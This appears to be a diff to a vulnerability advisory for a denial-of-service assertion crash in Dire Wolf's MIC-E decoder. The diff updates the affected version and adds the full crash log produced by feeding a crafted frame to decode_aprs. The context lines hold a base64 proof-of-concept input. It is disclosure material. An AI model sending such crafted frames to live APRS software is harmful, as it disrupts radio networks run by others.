@@ -22,7 +22,7 @@ A denial-of-service vulnerability exists in Dire Wolf in the function `aprs_mic_
 
 | Version                                       | Status                    |
 | --------------------------------------------- | ------------------------- |
-| 1.8 (latest release at time of reporting)     | Vulnerable |
+| 1.8.1 (latest release at time of reporting)   | Vulnerable |
 | Git master prior to commit `3658a87`          | Vulnerable |
 | Including and after commit `3658a878920803b…` | Patched  |
 
@@ -83,6 +83,45 @@ echo "JycnJycnJycQACcnJycnJycnJycnJycnJ56mpqaukohEAyInnqampq6SiEQDIkVniQA=" | ba
 # Expected output on vulnerable version:
 # decode_aprs: ...decode_aprs.c:1672: aprs_mic_e: Assertion `strlen(mcomment) > 0' failed.
 # Aborted (core dumped)
+```
+
+Complete output:
+
+```
+/htp/direwolf/direwolf-1.8.1/build $ ./src/decode_aprs < testit
+
+27 27 27 27 27 27 27 27 10 00 27 27 27 27 27 27 27 27 27 27 27 27 27 27 27 9e a6 a6 a6 ae 92 88 44 03 22 27 9e a6 a6 a6 ae 92 88 44 03 22 45 67 89 00
+--- AX.25 frame ---
+ dest    ......  3 c/r=0 res=1 last=1
+ source  ......  3 c/r=0 res=1 last=1
+  000:  27 27 27 27 27 27 27 27 10 00 27 27 27 27 27 27  ''''''''..''''''
+  010:  27 27 27 27 27 27 27 27 27 9e a6 a6 a6 ae 92 88  '''''''''.......
+  020:  44 03 22 27 9e a6 a6 a6 ae 92 88 44 03 22 45 67  D."'.......D."Eg
+  030:  89 00                                            ..
+-------------------
+''''''''<0x10><0x00>'''''''''''''''<0x9e><0xa6><0xa6><0xa6><0xae><0x92><0x88>D<0x03>"'<0x9e><0xa6><0xa6><0xa6><0xae><0x92><0x88>D<0x03>"Eg<0x89><0x00>
+Internal error detected in ax25_get_no_with_ssid, /htp/direwolf/direwolf-1.8.1/src/ax25_pad.c, line 1428.
+Address index, 0, is too large for number of addresses, 0.
+Internal error detected in ax25_get_addr_with_ssid, /htp/direwolf/direwolf-1.8.1/src/ax25_pad.c, line 1339.
+Address index, 1, is too large for number of addresses, 0.
+Internal error detected in ax25_get_addr_with_ssid, /htp/direwolf/direwolf-1.8.1/src/ax25_pad.c, line 1339.
+Address index, 0, is too large for number of addresses, 0.
+'nul' character found in Information part.  This should never happen with APRS.
+If this is meant to be APRS, ?????? is transmitting with defective software.
+Internal error detected in ax25_get_addr_with_ssid, /htp/direwolf/direwolf-1.8.1/src/ax25_pad.c, line 1339.
+Address index, 0, is too large for number of addresses, 0.
+Invalid character "?" in MIC-E destination/latitude.
+Invalid character "?" in MIC-E destination/latitude.
+Invalid character "?" in MIC-E destination/latitude.
+Invalid character "?" in MIC-E destination/latitude.
+Invalid character "?" in MIC-E destination/latitude.
+Invalid character "?" in MIC-E destination/latitude.
+Invalid MIC-E N/S encoding in 4th character of destination.
+Invalid MIC-E Longitude Offset in 5th character of destination.
+Invalid MIC-E E/W encoding in 6th character of destination.
+Invalid symbol table code not one of / \ A-Z 0-9
+decode_aprs: /htp/direwolf/direwolf-1.8.1/src/decode_aprs.c:1672: aprs_mic_e: Assertion `strlen(mcomment) > 0' failed.
+Aborted
 ```
 
 ---
